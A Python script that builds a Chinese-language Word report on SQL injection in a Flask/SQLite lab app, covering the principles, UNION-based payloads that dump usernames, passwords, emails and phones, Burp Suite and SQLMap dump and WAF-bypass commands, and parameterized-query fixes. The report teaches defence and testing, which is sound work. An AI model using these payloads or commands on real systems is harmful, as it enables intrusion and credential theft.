from docx import Document
from docx.shared import Inches, Pt, Cm, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn

doc = Document()

# ── 全局样式 ──
style = doc.styles['Normal']
font = style.font
font.name = 'Microsoft YaHei'
font.size = Pt(10.5)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def add_heading_styled(text, level=1):
    h = doc.add_heading(text, level=level)
    for run in h.runs:
        run.font.color.rgb = RGBColor(0x1A, 0x1A, 0x2E)
    return h

def add_code(text):
    p = doc.add_paragraph()
    p.paragraph_format.left_indent = Cm(0.5)
    run = p.add_run(text)
    run.font.name = 'Consolas'
    run.font.size = Pt(9)
    run.font.color.rgb = RGBColor(0x2D, 0x2D, 0x2D)
    return p

def add_alert(text, level="info"):
    p = doc.add_paragraph()
    if level == "danger":
        run = p.add_run(f"⚠ {text}")
        run.font.color.rgb = RGBColor(0xCC, 0x00, 0x00)
    elif level == "warning":
        run = p.add_run(f"⚠ {text}")
        run.font.color.rgb = RGBColor(0xCC, 0x66, 0x00)
    else:
        run = p.add_run(f"💡 {text}")
        run.font.color.rgb = RGBColor(0x66, 0x7E, 0xEA)
    run.bold = True
    return p

# ─────────────────────────────────────────
#  封面
# ─────────────────────────────────────────
doc.add_paragraph()
title = doc.add_paragraph()
title.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = title.add_run('SQL 注入漏洞原理、利用与修复\n安全测试报告')
run.font.size = Pt(24)
run.bold = True
run.font.color.rgb = RGBColor(0x66, 0x7E, 0xEA)

doc.add_paragraph()
meta = doc.add_paragraph()
meta.alignment = WD_ALIGN_PARAGRAPH.CENTER
meta.add_run('基于 Flask + SQLite 靶机环境\n').font.size = Pt(11)
meta.add_run('项目地址：https://github.com/simengyu-i/flask-user-manager\n').font.size = Pt(11)

doc.add_page_break()

# ════════════════════════════════════════════
#  第一章：SQL 注入原理
# ════════════════════════════════════════════
add_heading_styled('第一章：SQL 注入原理', level=1)

add_heading_styled('1.1 什么是 SQL 注入', level=2)
doc.add_paragraph(
    'SQL 注入（SQL Injection）是一种将恶意的 SQL 代码插入到应用程序的输入参数中，'
    '并在后端数据库服务器上执行的攻击方式。攻击者可以利用该漏洞绕过认证、窃取数据、'
    '甚至获得数据库服务器的控制权。'
)

doc.add_paragraph(
    'SQL 注入的本质是：应用程序将用户输入的数据直接拼接到 SQL 语句中，'
    '而没有对用户输入进行充分的验证或转义，导致用户输入的数据被当作 SQL 代码执行。'
)

add_heading_styled('1.2 注入原理图解', level=2)
add_code('''正常执行流程：
  用户输入 "admin"  →  SELECT * FROM users WHERE username = 'admin'
                                                       ↑
                                                作为字符串值使用

注入攻击流程：
  用户输入 "' OR 1=1 --"  →  SELECT * FROM users WHERE username = '' OR 1=1 --'
                                                                ↑         ↑
                                                          闭合引号  永真条件  注释掉后续SQL
  → 返回所有用户数据！''')

add_heading_styled('1.3 漏洞产生的条件', level=2)
doc.add_paragraph('SQL 注入漏洞的产生需要同时满足以下三个条件：')
p = doc.add_paragraph(style='List Bullet')
p.add_run('用户输入可控：').bold = True
p.add_run('应用程序接收了用户的输入参数（GET/POST/ Cookie 等）')
p = doc.add_paragraph(style='List Bullet')
p.add_run('未过滤/转义：').bold = True
p.add_run('应用程序未对用户输入进行严格的过滤、转义或参数化处理')
p = doc.add_paragraph(style='List Bullet')
p.add_run('字符串拼接：').bold = True
p.add_run('应用程序使用字符串拼接的方式构造 SQL 语句')

doc.add_paragraph()
add_heading_styled('1.4 漏洞代码示例', level=2)
doc.add_paragraph('存在漏洞的代码（本项目中的 /search 路由）：')
add_code('''# ❌ 存在 SQL 注入漏洞的写法
keyword = request.args.get("keyword", "")
sql = f"SELECT * FROM users WHERE username LIKE '%{keyword}%'"
c.execute(sql)

# ✅ 修复后的写法（参数化查询）
sql = "SELECT * FROM users WHERE username LIKE ?"
c.execute(sql, (f"%{keyword}%",))''')

doc.add_page_break()

# ════════════════════════════════════════════
#  第二章：SQL 注入分类
# ════════════════════════════════════════════
add_heading_styled('第二章：SQL 注入分类', level=1)

table = doc.add_table(rows=6, cols=3, style='Light Grid Accent 1')
table.alignment = WD_TABLE_ALIGNMENT.CENTER
headers = ['分类方式', '类型', '说明']
for i, h in enumerate(headers):
    table.rows[0].cells[i].text = h
data = [
    ('参数类型', '数字型', '参数为数字，无需引号闭合'),
    ('', '字符型', '参数为字符串，需要引号闭合'),
    ('响应方式', '显式注入（Union Based）', '结果直接回显在页面上'),
    ('', '盲注（Boolean/Time Based）', '无直接回显，通过页面变化推断'),
    ('注入位置', 'GET/POST/Cookie/Header', '任何用户可控的输入点都可能存在注入'),
]
for i, (a, b, c) in enumerate(data, start=1):
    table.rows[i].cells[0].text = a
    table.rows[i].cells[1].text = b
    table.rows[i].cells[2].text = c

add_heading_styled('2.1 数字型 vs 字符型', level=2)
doc.add_paragraph('数字型注入：参数直接拼接到数字字段，无需引号闭合')
add_code('''# 数字型
SELECT * FROM products WHERE id = 1
                         UNION SELECT ...
# 注入 payload:  1 UNION SELECT ...
''')
doc.add_paragraph('字符型注入：参数用引号包裹，需要先闭合引号')
add_code('''# 字符型
SELECT * FROM users WHERE username = 'admin'
                                    ' UNION SELECT ...
# 注入 payload:  admin' UNION SELECT ...
''')

add_heading_styled('2.2 判断注入类型的方法', level=2)
doc.add_paragraph('通过做减法运算来判断：')
add_code('''# 数字型测试
?id=1     → 正常显示
?id=2-1   → 如果结果和 id=1 一样，说明是数字型

# 字符型测试
?username=admin     → 正常
?username=admin'    → 报错或页面异常，说明存在字符型注入''')

doc.add_page_break()

# ════════════════════════════════════════════
#  第三章：SQL 注入步骤
# ════════════════════════════════════════════
add_heading_styled('第三章：SQL 注入操作步骤', level=1)

add_heading_styled('第一步：判断是否存在注入点', level=2)
doc.add_paragraph('在参数中输入特殊字符，观察页面是否出现异常、报错或内容变化：')
add_code('''# 正常请求
GET /search?keyword=admin    → 显示正常结果

# 测试注入
GET /search?keyword=admin'   → 页面报错或空白（说明存在注入）
GET /search?keyword=admin"   → 页面报错
GET /search?keyword=admin)   → 页面报错''')

add_heading_styled('第二步：判断闭合方式', level=2)
doc.add_paragraph('对于字符型注入，需要确定 SQL 语句是用什么符号包裹参数的：')
add_code('''# 常见闭合方式
'      单引号闭合（最常见）
"      双引号闭合
('     单引号加括号
("     双引号加括号

# 测试方法：逐一尝试，直到页面不报错
' OR '1'='1
" OR "1"="1
') OR ('1'='1
") OR ("1"="1''')

add_heading_styled('第三步：判断查询列数（ORDER BY）', level=2)
doc.add_paragraph('使用 ORDER BY 探测原查询语句返回的列数：')
add_code('''# 从 1 开始递增，直到报错
' ORDER BY 1--   → 正常（至少1列）
' ORDER BY 2--   → 正常
' ORDER BY 3--   → 正常
' ORDER BY 4--   → 正常
' ORDER BY 5--   → 报错！说明列数为 4

# ORDER BY 被 WAF 拦截时的备选方案
' GROUP BY 1--
' GROUP BY 2--
# ... 依次递增

# 或者直接用 UNION SELECT NULL 试探
' UNION SELECT NULL--        → 报错（列数不匹配）
' UNION SELECT NULL,NULL--   → 报错
' UNION SELECT NULL,NULL,NULL,NULL--   → 正常！列数为4''')

add_heading_styled('第四步：查询回显位置', level=2)
doc.add_paragraph('确定哪些列的数据会显示在页面上：')
add_code('''' UNION SELECT 1,2,3,4--
# 观察页面显示的数字，确定回显位置
# 如果页面显示"2"和"3"，说明第2、3列是回显位''')

add_heading_styled('第五步：获取数据库信息（SQLite）', level=2)

p = doc.add_paragraph()
p.add_run('获取 SQLite 版本：').bold = True
add_code("' UNION SELECT sqlite_version(),2,3,4--")

p = doc.add_paragraph()
p.add_run('获取数据库名（SQLite 中数据库名为文件路径）：').bold = True
add_code("' UNION SELECT group_concat(name),2,3,4 FROM pragma_database_list WHERE seq=0--")
doc.add_paragraph('注：seq=0 表示主数据库，SQLite 的主数据库序号永远为 0。')

p = doc.add_paragraph()
p.add_run('获取所有表名：').bold = True
add_code("' UNION SELECT group_concat(name),2,3,4 FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--")

p = doc.add_paragraph()
p.add_run('获取指定表的列名：').bold = True
add_code("' UNION SELECT group_concat(name),2,3,4 FROM pragma_table_info('users')--")

p = doc.add_paragraph()
p.add_run('获取数据：').bold = True
add_code("' UNION SELECT group_concat(id||'~'||username||'~'||password||'~'||email||'~'||phone),2,3,4 FROM users--")

p = doc.add_paragraph()
p.add_run('避免 NULL 值导致拼接失效：').bold = True
add_code("' UNION SELECT group_concat(coalesce(id,'')||'~'||coalesce(username,'')||'~'||coalesce(password,'')||'~'||coalesce(email,'')||'~'||coalesce(phone,'')),2,3,4 FROM users--")

p = doc.add_paragraph()
p.add_run('数据量过大时分页提取：').bold = True
add_code("' UNION SELECT id||'~'||username||'~'||password||'~'||email||'~'||phone,2,3,4 FROM users LIMIT 1 OFFSET 0--")

doc.add_page_break()

# ════════════════════════════════════════════
#  第四章：SQLite 特有说明
# ════════════════════════════════════════════
add_heading_styled('第四章：SQLite 数据库特有说明', level=2)

table = doc.add_table(rows=6, cols=2, style='Light Grid Accent 1')
table.alignment = WD_TABLE_ALIGNMENT.CENTER
table.rows[0].cells[0].text = '功能'
table.rows[0].cells[1].text = 'SQLite 语句'
sqlite_data = [
    ('获取版本号', "SELECT sqlite_version();"),
    ('获取数据库文件名', "SELECT name FROM pragma_database_list WHERE seq=0;"),
    ('获取所有表名', "SELECT name FROM sqlite_master WHERE type='table';"),
    ('获取表结构', "SELECT name FROM pragma_table_info('表名');"),
    ('字符串拼接运算符', "||  （例如：'a'||'~'||'b' = 'a~b'）"),
]
for i, (a, b) in enumerate(sqlite_data, start=1):
    table.rows[i].cells[0].text = a
    table.rows[i].cells[1].text = b

doc.add_paragraph()
add_alert('SQLite 没有 information_schema 数据库！', "warning")
doc.add_paragraph('与 MySQL 不同，SQLite 使用以下方式获取元数据：')

p = doc.add_paragraph(style='List Bullet')
p.add_run('sqlite_master：').bold = True
p.add_run('系统表，存储所有数据库对象（表、索引、视图）的元数据')
p = doc.add_paragraph(style='List Bullet')
p.add_run('pragma_table_info()：').bold = True
p.add_run('函数，返回指定表的列信息')
p = doc.add_paragraph(style='List Bullet')
p.add_run('pragma_database_list：').bold = True
p.add_run('函数，返回当前连接的所有数据库列表')

doc.add_page_break()

# ════════════════════════════════════════════
#  第五章：完整注入示例（基于本项目的 /search）
# ════════════════════════════════════════════
add_heading_styled('第五章：完整注入示例', level=1)
doc.add_paragraph('以下演示基于本项目的搜索功能（/search?keyword=...），使用 Burp Suite 或 curl 测试。')

add_heading_styled('5.1 逐步注入过程', level=2)

steps = [
    ("第1步：探测注入点",
     "GET /search?keyword=admin\n"
     "  正常返回结果\n\n"
     "GET /search?keyword=admin'\n"
     "  页面异常或报错 → 存在注入"),

    ("第2步：确定闭合方式",
     "GET /search?keyword=admin' OR '1'='1\n"
     "  返回所有用户 → 闭合方式为单引号 '"),

    ("第3步：确定列数",
     "GET /search?keyword=admin' ORDER BY 1--\n"
     "  ...\n"
     "GET /search?keyword=admin' ORDER BY 5--\n"
     "  报错 → 列数为4"),

    ("第4步：获取 SQLite 版本",
     "GET /search?keyword=admin' UNION SELECT sqlite_version(),2,3,4--"),

    ("第5步：获取表名",
     "GET /search?keyword=admin' UNION SELECT group_concat(name),2,3,4 FROM sqlite_master WHERE type='table'--"),

    ("第6步：获取列名",
     "GET /search?keyword=admin' UNION SELECT group_concat(name),2,3,4 FROM pragma_table_info('users')--"),

    ("第7步：提取数据",
     "GET /search?keyword=admin' UNION SELECT group_concat(id||':'||username||':'||password),2,3,4 FROM users--"),
]

for title, code in steps:
    p = doc.add_paragraph()
    p.add_run(title).bold = True
    add_code(code)
    doc.add_paragraph()

add_heading_styled('5.2 完整注入 payload 示例', level=2)
doc.add_paragraph('将以下 payload 经过 URL 编码后放入搜索框或直接请求：')
add_code('''# 原始 payload（未编码）
' UNION SELECT group_concat(id||'~'||username||'~'||password||'~'||email||'~'||phone),2,3,4 FROM users--

# Burp 中直接粘贴原始 payload 即可
# curl 中需用 --data-urlencode 或手动编码特殊字符''')

doc.add_page_break()

# ════════════════════════════════════════════
#  第六章：修复方案
# ════════════════════════════════════════════
add_heading_styled('第六章：修复方案', level=1)

add_heading_styled('6.1 参数化查询（Prepared Statements）', level=2)
doc.add_paragraph(
    '这是防御 SQL 注入最有效、最根本的方法。参数化查询将 SQL 语句模板和用户数据分开发送，'
    '数据库引擎会把占位符的值严格当作数据处理，不会解析其中的 SQL 关键字。'
)

doc.add_paragraph()
p = doc.add_paragraph()
p.add_run('修复前（存在漏洞）：').bold = True
add_code('''# f-string 拼接（漏洞代码）
keyword = request.args.get("keyword", "")
sql = f"SELECT id, username, email, phone FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
c.execute(sql)''')

p = doc.add_paragraph()
p.add_run('修复后（安全代码）：').bold = True
add_code('''# 参数化查询（修复代码）
keyword = request.args.get("keyword", "")
sql = "SELECT id, username, email, phone FROM users WHERE username LIKE ? OR email LIKE ?"
c.execute(sql, (f"%{keyword}%", f"%{keyword}%"))''')

add_heading_styled('6.2 注册功能修复对比', level=2)
add_code('''# ❌ 修复前（f-string 拼接）
sql = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
c.execute(sql)

# ✅ 修复后（参数化查询）
sql = "INSERT INTO users (username, password, email, phone) VALUES (?, ?, ?, ?)"
c.execute(sql, (username, password, email, phone))''')

add_heading_styled('6.3 为什么参数化查询能防御 SQL 注入', level=2)

table = doc.add_table(rows=3, cols=2, style='Light Grid Accent 1')
table.alignment = WD_TABLE_ALIGNMENT.CENTER
table.rows[0].cells[0].text = '对比项'
table.rows[0].cells[1].text = '说明'
fix_data = [
    ('字符串拼接', "用户输入 ' OR 1=1 -- 被直接拼入 SQL，变成 WHERE username = '' OR 1=1 --，改变原 SQL 语义"),
    ('参数化查询', "用户输入即使包含 SQL 关键字，也被当作字符串值处理，不会改变 SQL 结构"),
]
for i, (a, b) in enumerate(fix_data, start=1):
    table.rows[i].cells[0].text = a
    table.rows[i].cells[1].text = b

add_heading_styled('6.4 其他防御措施', level=2)

p = doc.add_paragraph(style='List Bullet')
p.add_run('最小权限原则：').bold = True
p.add_run('数据库连接使用只读或最小权限账号，限制敏感操作')

p = doc.add_paragraph(style='List Bullet')
p.add_run('输入校验：').bold = True
p.add_run('补充层面，对输入内容进行白名单校验（如只允许字母数字），但不能替代参数化查询')

p = doc.add_paragraph(style='List Bullet')
p.add_run('WAF 规则：').bold = True
p.add_run('部署 Web 应用防火墙拦截常见的 SQL 注入 payload 模式')

p = doc.add_paragraph(style='List Bullet')
p.add_run('避免错误信息泄露：').bold = True
p.add_run('生产环境关闭详细的数据库错误信息输出，防止攻击者获取线索')

p = doc.add_paragraph(style='List Bullet')
p.add_run('定期安全审计：').bold = True
p.add_run('使用 SQLMap 等工具定期扫描应用是否存在注入风险')

doc.add_page_break()

# ════════════════════════════════════════════
#  第七章：Burp Suite 实战
# ════════════════════════════════════════════
add_heading_styled('第七章：Burp Suite 实战操作', level=1)

add_heading_styled('7.1 设置代理并拦截请求', level=2)
doc.add_paragraph('1. 确保 Burp Suite 已打开，Proxy → Intercept 设为 Intercept is on')
doc.add_paragraph('2. 浏览器代理设置指向 127.0.0.1:8080')
doc.add_paragraph('3. 访问 http://192.168.126.129:5000/search?keyword=admin')
doc.add_paragraph('4. 在 Burp 中看到拦截到的请求，右键 → Send to Repeater')

add_heading_styled('7.2 在 Repeater 中测试注入', level=2)
doc.add_paragraph('1. 在 Repeater 中修改 keyword 参数的值')
doc.add_paragraph('2. 点击 Send，观察响应变化')
doc.add_paragraph('3. 例如将 keyword=admin 改为 keyword=admin\' UNION SELECT sqlite_version(),2,3,4--')
doc.add_paragraph('4. 如果页面显示了版本号，说明注入成功')

add_heading_styled('7.3 URL 编码注意事项', level=2)
table = doc.add_table(rows=6, cols=2, style='Light Grid Accent 1')
table.alignment = WD_TABLE_ALIGNMENT.CENTER
table.rows[0].cells[0].text = '字符'
table.rows[0].cells[1].text = 'URL 编码'
url_data = [
    ("' （单引号）", "%27"),
    ("空格", "%20 或 +"),
    ("| (管道符)", "%7C"),
    ("#", "%23"),
    ("--", "--（无需编码）"),
]
for i, (a, b) in enumerate(url_data, start=1):
    table.rows[i].cells[0].text = a
    table.rows[i].cells[1].text = b

doc.add_paragraph()
add_alert('在 Burp Repeater 中，直接粘贴原始 payload 即可，Burp 会自动处理大部分编码。', "info")

doc.add_page_break()

# ════════════════════════════════════════════
#  第八章：使用 SQLMap 自动化
# ════════════════════════════════════════════
add_heading_styled('第八章：使用 SQLMap 自动化注入', level=1)

doc.add_paragraph('SQLMap 是自动化 SQL 注入检测和利用的工具，可以替代手工测试：')

add_code('''# 基础扫描
sqlmap -u "http://192.168.126.129:5000/search?keyword=admin" --dbms=sqlite

# 获取数据库列表
sqlmap -u "..." --dbms=sqlite --dbs

# 获取表名
sqlmap -u "..." --dbms=sqlite -D main --tables

# 获取列名
sqlmap -u "..." --dbms=sqlite -T users --columns

# 导出数据
sqlmap -u "..." --dbms=sqlite -T users --dump

# 指定注入技术（U = Union Based）
sqlmap -u "..." --dbms=sqlite --technique=U --dump

# WAF 绕过 tamper 脚本
sqlmap -u "..." --dbms=sqlite --tamper=space2comment --technique=U''')

add_alert('SQLMap 只能用于你拥有授权的测试环境。对未授权系统使用属违法行为。', "danger")

doc.add_page_break()

# ════════════════════════════════════════════
#  第九章：安全与法律声明
# ════════════════════════════════════════════
add_heading_styled('第九章：安全与法律声明', level=1)

add_alert('本报告仅供安全学习和授权测试使用！', "danger")

doc.add_paragraph()
warnings = [
    '未经授权对他人系统进行 SQL 注入测试属于违法行为',
    '在中华人民共和国，根据《刑法》第285条、第286条，非法侵入计算机信息系统、非法获取数据最高可处七年有期徒刑',
    '本报告中的技术内容仅适用于你拥有完全所有权的测试环境',
    '测试完成后，必须使用参数化查询修复所有 SQL 注入漏洞',
    '输入过滤不可靠，参数化查询是唯一可靠的防御方案',
    '推荐使用 SQLMap 等自动化工具替代手工拼接，提高效率、降低风险',
]
for w in warnings:
    doc.add_paragraph(w, style='List Bullet')

doc.add_paragraph()
p = doc.add_paragraph()
p.alignment = WD_ALIGN_PARAGRAPH.CENTER
run = p.add_run('— 报告结束 —')
run.font.color.rgb = RGBColor(0x99, 0x99, 0x99)
run.italic = True

# ── 保存 ──
output_path = '/opt/flask_user_mgr/SQL注入漏洞报告.docx'
doc.save(output_path)
print(f'✅ 报告已生成：{output_path}')
